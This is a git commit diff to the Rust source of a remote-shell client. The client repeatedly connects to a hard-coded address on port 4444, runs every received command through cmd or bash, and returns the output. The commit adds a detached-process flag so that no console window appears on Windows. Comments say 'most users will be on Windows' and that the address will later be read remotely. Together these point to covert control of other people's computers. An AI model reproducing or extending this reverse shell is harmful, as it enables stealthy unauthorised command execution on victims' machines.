5630d9edb9aa82c81b2a54d43341c827be2b733e
khaiyuanyap <khaiyuanyap@gmail.com>
2022-11-06 11:35:23 +0800

    prevent console from popping up

--- client/src/main.rs
+++ client/src/main.rs
@@ -7,6 +7,7 @@ use std::{
     process::Command,
     thread,
     time::Duration,
+    os::windows::process::CommandExt
 };
 
 #[cfg(target_os = "windows")]
@@ -14,9 +15,12 @@ const SHELL: [&str; 2] = ["cmd", "/c"];
 #[cfg(not(target_os = "windows"))]
 const SHELL: [&str; 2] = ["bash", "-c"];
 
+const DETACHED_PROCESS: u32 = 0x00000008;
+
 fn main() {
     loop {
-        match TcpStream::connect("192.168.1.10:4444") { // Will change to something that can be remotely read from
+        match TcpStream::connect("192.168.1.10:4444") {
+            // Will change to something that can be remotely read from
             Err(_) => {
                 thread::sleep(Duration::from_millis(5000));
                 continue;
@@ -31,12 +35,15 @@ fn main() {
                             break;
                         } else {
                             let cmd = String::from_utf8_lossy(&input[0..input.len() - 1]);
+
                             #[cfg(target_os = "windows")]
-                            let _ = match Command::new(SHELL[0]).args(&[SHELL[1], &cmd]).output() {
+                            let _ = match Command::new(SHELL[0]).args(&[SHELL[1], &cmd]).creation_flags(DETACHED_PROCESS).output() {
                                 Ok(output) => {
                                     if cmd.starts_with("cd") {
                                         let _ = env::set_current_dir(
-                                            cmd.split_whitespace().nth(1).expect("The system cannot find the path specified."),
+                                            cmd.split_whitespace().nth(1).expect(
+                                                "The system cannot find the path specified.",
+                                            ),
                                         );
                                     }
                                     let _ = stream.write_all(
@@ -52,11 +59,14 @@ fn main() {
                             };
 
                             #[cfg(not(target_os = "windows"))]
+                            // Low priority as most users will be on Windows
                             let _ = match Command::new(SHELL[0]).args(&[SHELL[1], &cmd]).output() {
                                 Ok(output) => {
                                     if cmd.starts_with("cd") {
                                         let _ = env::set_current_dir(
-                                            cmd.split_whitespace().nth(1).unwrap(),
+                                            cmd.split_whitespace().nth(1).expect(
+                                                "The system cannot find the path specified.",
+                                            ),
                                         );
                                     }
                                     let _ = stream.write_all(
@@ -69,7 +79,8 @@ fn main() {
                                 Err(error) => {
                                     stream.write_all((error.to_string() + "\n").as_bytes())
                                 }
-                            };                            
+                            };
+
                         }
                     }
                     Err(_) => {
